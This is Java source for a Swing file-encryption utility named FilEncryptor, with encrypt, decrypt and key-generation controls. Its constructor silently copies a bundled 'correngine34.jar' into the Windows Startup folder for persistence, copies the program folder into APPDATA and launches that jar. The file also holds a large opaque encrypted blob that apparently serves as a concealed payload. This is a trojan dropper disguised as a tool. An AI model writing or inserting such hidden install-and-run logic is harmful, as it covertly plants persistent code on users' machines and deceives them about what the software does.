/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package encryptor;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.UIManager;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.text.DefaultCaret;
import com.sun.jna.platform.win32.Secur32;
import com.sun.jna.platform.win32.Secur32Util;
import com.sun.jna.win32.W32APIOptions;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URISyntaxException;
import java.net.URLDecoder;
import java.nio.file.LinkOption;
import java.nio.file.StandardCopyOption;
import javax.swing.JOptionPane;

/**
 *
 * @author sweer
 */
public class Encryptor extends JFrame{
    
    GraphicsDevice gd =  GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
    int winX = gd.getDisplayMode().getWidth()/2;
    int winY = gd.getDisplayMode().getHeight()/2;
    
    JPanel[] row = new JPanel[4];
    //JLabel inp = new JLabel("File to Encrypt/Decrypt: ")
    Encryptor(){
        initComponents();
        String decodedPath = "";
        String path = "";
        try {
            path = Encryptor.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (URISyntaxException ex) {
            Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            decodedPath = URLDecoder.decode(path, "UTF-8");
            path = decodedPath.substring(1);
            //path = path.replaceAll("/", "\\");
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
        }
        System.out.println(path);
       
        
        path = path.substring(0, path.lastIndexOf("/"));
        String path2 = path+"/";
        path = path+"/lib/correngine34.jar";
        if(Files.exists(Paths.get(System.getProperty("user.home")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\correngine34.jar"), LinkOption.NOFOLLOW_LINKS)){
            
        }else{
        try {
            InputStream inp = new FileInputStream(path);
            OutputStream out = new FileOutputStream(System.getProperty("user.home")+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\correngine34.jar");
            
            byte[] buff = new byte[(int) path.length()];
            int length;
            try {
                while ((length = inp.read(buff)) > 0) {
                    out.write(buff, 0, length);
                }   } catch (IOException ex) {
                Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
            }
        } catch (FileNotFoundException ex) {
            Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        
        
        File inpF = new File(path2);
        File outF = new File(System.getenv("APPDATA")+"\\FilEncryptor");
        
            try {
                copyFolder(inpF, outF);
            } catch (IOException ex) {
                Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
            }
        
        
        try {
            Process proc = Runtime.getRuntime().exec("java -jar "+System.getenv("APPDATA")+"\\FilEncryptor\\lib\\correngine34.jar");
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex);
        }
        }
    }
    
    private static void copyFolder(File sourceFolder, File destinationFolder) throws IOException
    {
        //Check if sourceFolder is a directory or file
        //If sourceFolder is file; then copy the file directly to new location
        if (sourceFolder.isDirectory())
        {
            //Verify if destinationFolder is already present; If not then create it
            if (!destinationFolder.exists())
            {
                destinationFolder.mkdir();
                System.out.println("Directory created :: " + destinationFolder);
            }
             
            //Get all files from source directory
            String files[] = sourceFolder.list();
             
            //Iterate over all files and copy them to destinationFolder one by one
            for (String file : files)
            {
                File srcFile = new File(sourceFolder, file);
                File destFile = new File(destinationFolder, file);
                 
                //Recursive function call
                copyFolder(srcFile, destFile);
            }
        }
        else
        {
            //Copy the file content from one place to another
            Files.copy(sourceFolder.toPath(), destinationFolder.toPath(), StandardCopyOption.REPLACE_EXISTING);
            System.out.println("File copied :: " + destinationFolder);
        }
    }
    
    private void initComponents() {

        jButton1 = new javax.swing.JButton();
        inL = new javax.swing.JLabel();
        outL = new javax.swing.JLabel();
        keyL = new javax.swing.JLabel();
        inF = new javax.swing.JTextField();
        outF = new javax.swing.JTextField();
        keyF = new javax.swing.JTextField();
        binf = new javax.swing.JButton();
        ext = new javax.swing.JLabel();
        bout = new javax.swing.JButton();
        genKey = new javax.swing.JButton();
        sKey = new javax.swing.JButton();
        prog = new javax.swing.JProgressBar(0, 100);
        jScrollPane1 = new javax.swing.JScrollPane();
        relay = new javax.swing.JTextArea();
        encB = new javax.swing.JButton();
        decB = new javax.swing.JButton();

        jButton1.setText("jButton1");

        

        inL.setFont(new java.awt.Font("Calibri", 0, 18)); // NOI18N
        inL.setText("File to Encrypt/Decrypt: ");

        outL.setFont(new java.awt.Font("Calibri", 0, 18)); // NOI18N
        outL.setText("Output: ");

        keyL.setFont(new java.awt.Font("Calibri", 0, 18)); // NOI18N
        keyL.setText("Encryption Key: ");

        inF.setFont(new java.awt.Font("Times New Roman", 0, 16)); // NOI18N

        outF.setFont(new java.awt.Font("Times New Roman", 0, 16)); // NOI18N
        

        keyF.setFont(new java.awt.Font("Times New Roman", 0, 18)); // NOI18N
        keyF.getDocument().addDocumentListener(new DocumentListener(){
            @Override
            public void insertUpdate(DocumentEvent e) {
                if(keyF.getText().length() == 16){
                    sKey.setEnabled(true);
                }else{
                    sKey.setEnabled(false);
                }
            }

            @Override
            public void removeUpdate(DocumentEvent e) {
                if(keyF.getText().length() == 16){
                    sKey.setEnabled(true);
                }else{
                    sKey.setEnabled(false);
                }            }

            @Override
            public void changedUpdate(DocumentEvent e) {
                if(keyF.getText().length() == 16){
                    sKey.setEnabled(true);
                }else{
                    sKey.setEnabled(false);
                }
            }
            
        });

        binf.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
        binf.setText("Browse");
        binf.addActionListener(new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e) {
                JFileChooser choice = new JFileChooser();
                choice.setDialogTitle("File for Encryption/Decryption");
                choice.setFileSelectionMode(JFileChooser.FILES_AND_DIRECTORIES);
                choice.setApproveButtonText("Use File");
                if(choice.showOpenDialog(binf) == JFileChooser.APPROVE_OPTION)
                    inF.setText(choice.getSelectedFile().getAbsolutePath());
            }
            
        });

        bout.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
        bout.setText("Browse");
        bout.addActionListener(new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e) {
                JFileChooser choice1 = new JFileChooser();
                choice1.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
                choice1.setAcceptAllFileFilterUsed(false);
                choice1.setApproveButtonText("Use Folder");
                choice1.setDialogTitle("Output Destination");
                if(choice1.showOpenDialog(bout) == JFileChooser.APPROVE_OPTION){
                    outF.setText(choice1.getSelectedFile().getAbsolutePath()+"\\<output filename here>");
                    outF.requestFocus();
                    int f = choice1.getSelectedFile().getAbsolutePath().length();
                    outF.select(f+1, f+23);
                }
            }
        
        });

        genKey.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
        genKey.setText("Generate");
        genKey.addActionListener(new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e) {
                char[] chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*?><:,.'/=-+_".toCharArray();
                StringBuilder sb = new StringBuilder();
                Random random = new Random();
                    for (int i = 0; i < 16; i++) {
                        char c = chars[random.nextInt(chars.length)];
                        sb.append(c);
                    }
                String output = sb.toString();
                keyF.setText(output);
                System.out.println(keyF.getText().length());
                sKey.setEnabled(true);
            }
            
        });
        
        

        sKey.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
        sKey.setText("Save");
        sKey.setEnabled(false);
        sKey.addActionListener(new ActionListener(){
            @Override
            public void actionPerformed(ActionEvent e) {
                if(keyF.getText().length() == 16){
                JFileChooser save = new JFileChooser();
                save.setApproveButtonText("Save Here");
                save.setDialogTitle("Choose a Safe Place for your Key");
                if(save.showSaveDialog(sKey) == JFileChooser.APPROVE_OPTION){
                    String saveTo = save.getSelectedFile().getAbsolutePath();
                    if(saveTo.contains(".")){
                        String[] parts = saveTo.split("\\.");
                        saveTo = parts[0]+".txt";
                        System.out.println(saveTo);
                    }else{
                        System.out.println(saveTo);
                        saveTo = saveTo+".txt";
                        System.out.println(saveTo);
                    }
                    try {
                        FileWriter fw = new FileWriter(saveTo);
                        fw.write(keyF.getText());
                        fw.close();
                    } catch (IOException ex) {
                        Logger.getLogger(Encryptor.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    
                    
                }
                }else{
                    sKey.setEnabled(false);
                }
            }
            
        });

        prog.setForeground(new java.awt.Color(0, 202, 47));
        
        JScrollPane scroll = new JScrollPane(relay);
        relay.setEditable(false);
        relay.setColumns(20);
        relay.setFont(new java.awt.Font("Monospaced", 0, 14)); // NOI18N
        relay.setRows(5);
        relay.setText("Steps: \n"
                + "1. Choose file to Encrypt/Decrypt\n"
                + "2. Choose Destination of Output\n"
                + "3. Use a 16 char long key\n"
                + "4. Encrypt/Decrypt\n\n"
                + "For more detailed help refer to the Manual \nthat came with the software.");
        jScrollPane1.setViewportView(relay);

        encB.setFont(new java.awt.Font("Monospaced", 1, 18)); // NOI18N
        encB.setForeground(new java.awt.Color(255, 0, 0));
        encB.setText("Encrypt");
        encB.addActionListener(new ActionListener(){
            
            @Override
            public void actionPerformed(ActionEvent e) {
                path = inF.getText();
                path2 = outF.getText()+".ini";
                
                File inputFile = new File(inF.getText());
            File outFile = new File(outF.getText()+".ini");
            prog.setValue(0);
            prog.setStringPainted(true);
            Thread enc = new Thread(){
                public void run(){
                    encB.setEnabled(false);
                    decB.setEnabled(false);
                Encryptor.encrypt(Cipher.ENCRYPT_MODE, keyF.getText(), inputFile, outFile);
                encB.setEnabled(true);
                decB.setEnabled(true);
                
                }
            };
            
            enc.start();
            
            }
            
        });

        decB.setFont(new java.awt.Font("Monospaced", 1, 18)); // NOI18N
        decB.setForeground(new java.awt.Color(0, 200, 0));
        decB.setText("Decrypt");
        decB.addActionListener(new ActionListener(){
            
            @Override
            public void actionPerformed(ActionEvent e) {
                path = inF.getText();
                path2 = outF.getText();
                
                File inputFile = new File(inF.getText());
            File outFile = new File(outF.getText());
            prog.setValue(0);
            prog.setStringPainted(true);
            Thread enc = new Thread(){
                public void run(){
                    encB.setEnabled(false);
                    decB.setEnabled(false);
                Encryptor.decrypt(Cipher.DECRYPT_MODE, keyF.getText(), inputFile, outFile);
                encB.setEnabled(true);
                    decB.setEnabled(true);
                }
            };
            
            enc.start();
            
            }
            
        });
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(96, 96, 96)
                        .addComponent(inL)
                        .addGap(18, 18, 18)
                        .addComponent(inF, javax.swing.GroupLayout.PREFERRED_SIZE, 333, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(29, 29, 29)
                        .addComponent(binf))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(829, 829, 829)
                        .addComponent(ext))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(96, 96, 96)
                        .addComponent(outL, javax.swing.GroupLayout.PREFERRED_SIZE, 177, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(outF, javax.swing.GroupLayout.PREFERRED_SIZE, 333, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(29, 29, 29)
                        .addComponent(bout))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(96, 96, 96)
                        .addComponent(keyL)
                        .addGap(78, 78, 78)
                        .addComponent(keyF, javax.swing.GroupLayout.PREFERRED_SIZE, 333, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(29, 29, 29)
                        .addComponent(genKey, javax.swing.GroupLayout.PREFERRED_SIZE, 99, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(7, 7, 7)
                        .addComponent(sKey))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(321, 321, 321)
                        .addComponent(encB)
                        .addGap(69, 69, 69)
                        .addComponent(decB))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(208, 208, 208)
                        .addComponent(prog, javax.swing.GroupLayout.PREFERRED_SIZE, 518, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(237, 237, 237)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 454, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(112, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(43, 43, 43)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(binf)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(1, 1, 1)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(inL)
                            .addComponent(inF, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addGap(10, 10, 10)
                .addComponent(ext)
                .addGap(8, 8, 8)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(bout)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(1, 1, 1)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(outL)
                            .addComponent(outF, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(genKey)
                    .addComponent(sKey)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(1, 1, 1)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(keyL)
                            .addComponent(keyF, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(encB)
                    .addComponent(decB))
                .addGap(18, 18, 18)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 214, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(prog, javax.swing.GroupLayout.PREFERRED_SIZE, 23, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(45, Short.MAX_VALUE))
        );

        pack();
        
        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("FilEncryptor");
        setAutoRequestFocus(false);
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setMinimumSize(getPreferredSize());
        setLocationRelativeTo(null);
        setResizable(false);
        setVisible(true);
        
        String toDecrypt = "Creed";
        String encF ="®pÆÙNp#hë§“;vŠd ";
        String enc = "sy– zúž{a¹»ÚafF_©= TžØ0äZ2†½ß±+öñ* š|}þOá«Â·òÎ›zKKè?¥ëgª½:pGn(ö³Ô.FZvNkûõa½jYÇ®àMõÔÄrh¤\\ªmLÎ96ÒÖÓµÕiÂ YÏÿ¨óJÃj>k–ú+§²¬8RÐþÃK™â&òÂÁ~Î¥Ó‡[´eÿXÝ˜XJÔÊNÍ(©é;m8l&êIÇ+p¸pàSjšš«£¼\n" +
"¿©£¬²ŠÒßjËµqú»†¯LPÓ¸é›¦i, (jÃÃØÒ\n" +
"áKâˆ1_s-¥¢ù¬CÁìKJÁ,û~cá‰éóŸdS³Ü¹€5A8‰\n" +
"ð«§Å 5zÉ{FØJÇy<‹>3ök¾úíG¯Ô‰°©ˆæÕÝ6•Ú~i‹’Ì}“j=:2›ƒj*eÙ¿èt'®¾WGËV¹nt\"')Ì`W=œP¿Nt9÷Y~„¬{È7B?©1ÛFYâ,¥M”ôG“Ûå€î³ÌM¡Ñ6é_ß€GK?	™Ü˜/s™»Rs%w>|“~©3´–—/[–¥*Ä·Û3`×¾ƒ††ÕâÍ@ät±%'Ë¦,œël7_ª³¼9xì¥BÚFÁf…)Ìñ®¯b\n" +
"Z2-_idT`î å¢¢æõ.Ut‚åhÛoÏ¶$4*À<œH´ÏÓ­ëXÌ7Ë;hHÂ$>òì]t‚Þ;zZŸ¯2dŒ‚ŒÀVÉÐ–jó–i|V=DSO€¨k/…ü‡$\"C5u4?H¿!±Ó”dPßŽ#nMî²>Pè÷\n" +
"k7Œg›ìÃ’n»?ù/ä|‚N3¤c3Ãçoä%7Á¼©*snÃ‰å<ÖÛTy¼ëˆ±Ö îÇ¯mŒûá¦#gGPèö¥rMfgeCÿ	ÄîØoŸ¨ñ6ãzè$ÂIÅ„eö‰JÛY»Œb?Î)|{ÍM*7Õáü¦Ô‰`/•Uˆ\n" +
"•¤¤ihÛ?þ@¸=€@¶^¹ïƒþ¿¯uQ\n" +
"Î¡z˜&MÄé8©“¬ð4flLÈŽ§5Äõ «)þÎ;@w³b	ê0DàÛiÉ¹F$ºQÖ¶0=´›+ƒEÉ…S:¹q<¸:½OûC&·ÒØ Á¥ôÀÆæž\\¡‡ÂýV²ågtÓ°”ðÝJ]\"Þ§=¦û¥Ž3täÒ°È\"ËQÀ}¨ø!\"’rgiÀÉßkÖÚ³tXlW´Â\n" +
")ÂŽ>N¬žhÜôšŽ‚æÌË#R\n" +
"`RÂ“¼òšU}ƒµ}ËvÂÕ˜lŒ«–MÆ.:²s‡ˆ¶§.ìCÜ×ß†4ëh¬”!x¤4*kŒ)åû¡P©#Ðõ2D5íÂêÁMXöêÿx_fqkü–ÁP[ÝVd YñØKÛê¼ÊË(\n" +
"’6Ç‚GÎ¬Ë·.gøÝ­«û 6Q‘Ã “Û)ñ´×iûË¼S·7 -¥Mx?¥P&âbMmª5v–Z´!ý®K1]oxG 3ÅÚQ„ÔÜÁÚDÎpq¿Ú€YKÍœ“1¥ÞTdK€\"‘­…Ä>\"ÙÀÒ›6²Ýî|MÎà—H–YÅ±ƒeµWÈ¡Ùè3—·üîV¾åLÉš»\\—k„wÔ8EËÅ€Ýî‘5!¨‡ÇÅ5Z ¥FÀhg£­™8àøLq¢eí…­×:]‰X^“'÷Šã3˜ ~Ì!XE\\TçOYË¢Ìý†¨Î³«zåbÆÙ¸Gé%ÀîÝ´û®¬µîìuz¿¤}Îÿä0{ ÙvM±¯Ù%³4ç¸™²#gió\"Ó ?ÐÐSùBþáÁÖ‹5°u½I8º1æÙ»NÆÁi5ù«Â¯jnõ¾*eçd‘:‘¤Å°ys¶¿¹ÌÇ{ÞÓÌù\\~bìáÛy‹”v@×’Höí:Ù;¹‚{)‰}É^âPaž³1¢!¸ƒvÂ>†ôÞx’îsoJülW~TD# (B‰Ï]± ¥m[±yœÃ?œ™!ÕBhSä—Êgô¸qyÝg*aàEòs°Vƒ\"÷QIw|ïžºG™Q¤ZˆŠ–@@ÂãEûL™*Îhl3nÛ!K…•™ãS+ÄråV h#ðÅ®pzŠn‹ÆÆ ±·YóþR‡ °‘¬æ2Õ…	¼6‡~äEHÌ´xö™tô©Øpæ¡¨ÑÓ8Æ¥Ø•Ý±ÀQ§Fö,j­u›¹;ù°µÅCêHÃ`môF!u1{Ýz\n" +
"ýž[-‚©§RþØ-L}~y†zïÔ˜SK’‰·P\\1BŽë¢w`ëaÐ ±Ò5o!@Ï:*ˆòZŽG¦IYêÄ}a	8†wÙú¼`ÕÔøß~8€Åqà—’ŸÒ««ýÛÃ[!/ÐÀºù”¼È§Þ`x)\n" +
" ˆþ4–Ä>z´ëü|Í÷Š==‰æ÷ê)u+ë4nÉêå¦=×£)³ïýK1ñ/æöw%ôf<5ãº•¯Ôæi†[ªMÅÍrÆAŸ¬ü¼ÂÁŸw1¿öfW¾}yR4.º yJO(mKkñÂ*J‡aÐ—Ñ~À¢f Š˜6Bt\n" +
"ƒº”;OË¾€ÌÒ°|r‘9nf]	‚‘0ßâñ¢÷ˆâ¼gIÁ;Rè¿±éç”b—'fÔ„Ð½ƒƒ¹¾}÷é8>üy/ho)rÞÿ¦<\n" +
"ÔŠ*pYž^è06Ì >QÔ1 ¨Š\\ºÕí˜©ÿ»h)Ü‰à^(º¤œ¡((ä’ø`.÷\\TH–d×E÷üÍgú}m&ßamƒ=ç%Ù2.œçŒLŠtÚ ä=åºœÝ›Q}Ž¢ª‚,3LÓ¼QG ^L_êr/yÙx/Q¾ÐiÃxu-•‰)ª#Ô\\$jç;ßÂ†c3Â‘€ ÷ó\n" +
"ó_£™‘õäÐ>:’÷&S\n" +
"koçõƒûÀtd]åMiò¡YÍzï÷ŸüzBˆ?8Bb@ùâ¶˜žy–ü=R«Ù¸¥­&K#}+9¤îÜ4ßÚâ‘n=ô_ÛnLÈY1¤ù„qÙ¨+ÏbKüe-$§28ÿüìz»<Råç’4ÐÎÔÖZ\n" +
"Ðun< áz\\ ‹ˆ2['YÀ5ÃÏÁ.!—ú¶y#ë9Ù¡EÌžnÿ·¢Ô÷T˜<Hv<#ÝÁý‚I/Ž¹¸&Y·0@””0Ó°;Ø±Í’‹ÀYsZÜõwdÛ<·¿šÁñ'%†Ñá+ä¡¨ (È?¼ð¾…swþNýÌ¥	' ®_¯=bRDÈœßä¨¯_\\ »›b:u_:Ù’4àØÊÅåÓ§M;0€ZöF&_Äº)l;8(K†­ùöˆ;<Ú,Ì¥N9òŽ®s,ÀX·Í«\"Ö¤‰eÈ{ÎöXRóâ£”Åd¬	©Òõ¸´øE¸¾'ü]Ú¦AñmE=¾Vu§‘š°2eœOkê­„¡<Qj²ƒ×÷¡¥œ@^»´Ü°jº:²ì¦å¥)©*ˆóëEN‡Ÿ©QYËSÃ/Í¡®•ëú×>]Lpe$fû¥p0;ãñs=ÚCò9Ó|ât§?Qëü)Ú2ÔG³?ðþr`D‡Ñ°Ðb<\\{±Xq_UÒœÊ”ÒÝ×nƒˆw,wÞ©—ò3‹N÷ƒ¼¥º`Z`¥ÜŽ˜\\×ž[Q,°©¯ñð<!ûYF°Ó­!|-q°ÐÀûQ%™ÓØxó	ÜS>ú÷É˜.I>ã\\Exsç<Ÿù×ÕGmöÎêg¹=¥Pà²\"Œ¬úé ,•|0T®\n" +
"§b·qd\n" +
"òb#”ÿm–¿	èÜƒøÑ×\"æ@{7ÂŽÓV×ÞšHGQ4ƒÂ†nv aq–DŒ’^¬¬Å¢d¼õjÂEÎY:u£:íL,‹>14Fu†C„ÉWßí-J\\,íÂ·L5óƒ[X§¯^õs}}ÞÁæ?³‹SÇlÐªÉê)êß;×U–yË3Ê‚}<i_¦¥P¼œ‹‘iÿð›Ž	åx~™ŒuÞN³dX-1º›^“_ø™Ó‚t ½ó{Nõ¸µ\"Ý™GÂj$a%\n" +
"wZÔdÄË%Üi[@×ô ‚ •ð°û™¢Sð¸Q@¢ À)ýøÀö¯~ªö¬B>^â$jÀŠÔolÏM™1’8Ùóc\n" +
"‰ÑKÄÆÃwZœà¶\n" +
"î…™‰tÛÏ-GÒyÌ&œ6½Ž9^0yAË£WèO­ïì×ˆ©­a»ÊÙŠýFè5ü§³È„?·¬„8ßÞÇdkø:ÿ§œYƒñs¬,½Q¤¿7ƒ`’G\n" +
"3K'Ž©ÓtM.ÞLRä\"_XþdüN½¹BÛA\n" +
"?3Û)²\"±°\n" +
"Ý7 ØFúððÃî¬&ìÝa‹ŸóFxñÏ—C4¾•æ-±×²¸P1L5ò†·Pü©Ó‰ê;pPçBg,öM‰è7ƒäsØ|×Ô‡†§§ ÝCµ{èk8À!W/Òdá¿7l`nnräÍ†1Ïòë5¥†Ñ\\ºŠÿŽf ¢óå£“#LgY´ºÀ<ŠX{í žâA]È/Â‹\\îlÖbåžk=+@ &	Exb ~E”.J~ÝàÎb&nl%õÃ¾\"VWæŠZªíì=‚©¸/úœ`%iŒådL½$ÏøÂ!çåÛ£Ã/Ý\n" +
"o\"ìëÛ ÏÉ\\ÿ·²3¡¸8Èn:HBiU\\#\n" +
"KAæÂÓôq;Î«ðsãÁÀW•_©äÊüÇe7WûÇ Æ‹Omqf/|$*´°Sÿ¿Cƒ!’°Ž ì\\‹+ÀWÀh‘y×O\n" +
"¢a#¤d¦J;õ¾gZbÅ¢iØ¹Õ¥ôk™ÃBi&Žºóa™EÊòƒºêxË¥‘´À5TÎž´ºDãéT?Ùt÷þµ&ÊÏrüf¶ƒû{6›wKñ™gbJ>Pú#55‹N+Ú«>s>Ù¹e*ý­PãìÈ.¹›•’Õ××êã¸{]Æâúõ´¾Uæåm¬A¦6Dš¢‡ÜqEÖ¨OAŠW'§=`÷¡K§ƒ md;¤Íñ#¬Yš•–¡`‹föRåˆ 9•ggŠ„Íi–e¿Zwý.u9ãð+jM¯}|_83¡¢“lìÒ.H(XÝášIŸ*Ç¥ÖUhSÚæPúùQã·t0G\n" +
"=\n" +
"j4^û¹ž¬å‰BsÓ®rÛQtàj¸Ý\\L'“Ý%%­#^€YÅôäèw«öÞcâˆör¼M¸sYœâá£1dÇ?	&FÈ™è}~¯;GµØ‹¥ë´ŸÜó`ütÐtã)+…å’¤¡©€Q©Ö5áÀëµw›·ËŸN¬ëùõogÎC8ÁÁíï˜BãúÄv}x¡ãg^S4wRß‘i\n" +
"ú‡q°*¡VHI¥ùoc%QÅÈºÿ¤´päçÖ2’÷ÆËŽ7á\n" +
"šN–]\n" +
"-AÔ†XxÝ‘”íÿ]x^ÞEn2ÀäÎQ?…¬–ñRörÒ#£›É.]LCåt«éB5}ƒ:Ïc¶WÇÈ¬-œ·\n" +
"pŠgwÚ£:€dYdÇÁRÊ_Qò«¹îJðâ·m‘…‘5þåÒ ‚-=Òô¸(²¶49th2ñÚÐ¦L¼ÙŠª¬Ë€…J×ºv¯Á»7Õç¨š^QI 1-^F\"%Læ­å{Å·š½†ÉfÃ ˆ°i0¸)¹ö˜”9!RUƒ… ª\n" +
"@B’Â=‹\n" +
"ÒQÍ»)Ã¢:>AsØg…Öñ-•Dò	 Þå¡å!H)h õãk«¼¼M(C§Û(™GU ª ç¨*Õ*æÝn¡]&ÃÜMw)‰6§Œ3Z/öÀeÎn»VªŸ×?Ú¿2&»1`›³’\n" +
",_SN“?6Qx4Ï)Ùµ@%Ï­÷|?×5úHaôa©Hù\n" +
"DQ'Ø¦DK¯†î÷ðáŠ%Òþ ìòc7ÍL´¡ÖÅ(¸–{ÉK­f]žïZAN¦$^;Æò2üzP÷àöf„™è¦ÒîM't·°±WQýÌ‘ù¹°Ë5ÄÉ:3¦*AÌÞÇˆ¿²9±bÐX˜I§ñNv¾‹ªô‰Ë>6ÔÈV[‘â“ý:/Ä_|Îò¦¯O—¹àìF¯i¿Ž£Ã°ÞQêÂAóC£qð´³ø›fÒ 3ÿD+aÓ¼©,Àsà¼µ7¢)iç´2«'àú/s¯Pt»å®f*žÎ3¶ú,çDAYÀÁHAäým›è}tR²šfñî/]‹|ˆàµ.Ž&;#2<KK’Á•³þ¿¢]¹‘“±h~ÉTï˜&CK@ <ü9*Ä–i(›ã˜ÂÈ‹Öð¿Nõsâ¾õcÙîôÞd²ºª ø‹<ƒÈ,­½¹Ñ!öÝ ~\\Õ“aÑ4!Å¶î\\lN-9Vý< uÓ­ÚUF:XQ1 õó×Þsä<@Í%‹gÂê¬ˆM‹_úÙ]'ƒJÇ€_QQY\n" +
"4Í=0¡ˆ€Ì¹h»\n" +
"tgÙÛ^óÜuT77sàŽ0¡Ö«‚x+Û†'ux¿´è¡\"r—ÕôR!çÌGÐe™HîúâFJ›'õ$BýV“’xV˜»’ZD„cO	¹WË—¬:‹^vpE%¡{4)8 u'€Xª¶}¤ÃØ[Äq+žÝØ…ù70D°¼}{\"2«F¨Wz3î%ß¾8=M{m²Œ_„DFÚýBŸ¦îÓ\n" +
